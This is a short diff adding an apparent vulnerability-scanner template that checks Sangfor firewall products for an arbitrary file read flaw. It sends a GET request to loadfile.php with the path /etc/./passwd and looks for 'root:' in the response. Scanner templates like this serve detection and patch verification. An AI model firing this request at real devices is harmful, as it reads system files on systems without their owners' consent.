@@ -1,0 +1,11 @@
+name: 深信服-防火墙-深信服防火墙类产品
+description: >-
+  任意文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /svpn_html/loadfile.php?file=/etc/./passwd
+    expression:
+      status: 200
+      body_all: ["root:"]
